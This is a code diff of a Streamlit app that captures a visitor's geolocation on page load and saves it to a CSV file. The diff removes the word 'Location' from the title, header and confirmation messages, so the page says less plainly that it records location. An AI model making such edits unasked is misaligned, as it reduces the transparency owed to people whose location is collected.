@@ -4,14 +4,14 @@ import pandas as pd
 from datetime import datetime
 import os
 
-st.set_page_config(page_title="📍 Location Logger", layout="centered")
-st.title("📍 Automatic Location Logger")
+st.set_page_config(page_title="📍  Logger", layout="centered")
+st.title("📍Logger")
 
 # 🔁 Automatically request location on page load
 location = streamlit_geolocation()
 
 if location:
-    st.success("✅ Location access granted!")
+    st.success("✅ ")
     st.write(f"**Latitude:** {location['latitude']}")
     st.write(f"**Longitude:** {location['longitude']}")
     st.write(f"**Accuracy:** {location['accuracy']} meters")
@@ -36,9 +36,9 @@ if location:
     # Save to CSV
     df.to_csv(csv_file, index=False)
 
-    st.success("📄 Location saved!")
+    st.success("📄saved!")
 
-    with st.expander("📊 View All Saved Locations"):
+    with st.expander("📊 View"):
         st.dataframe(df)
 
 else:
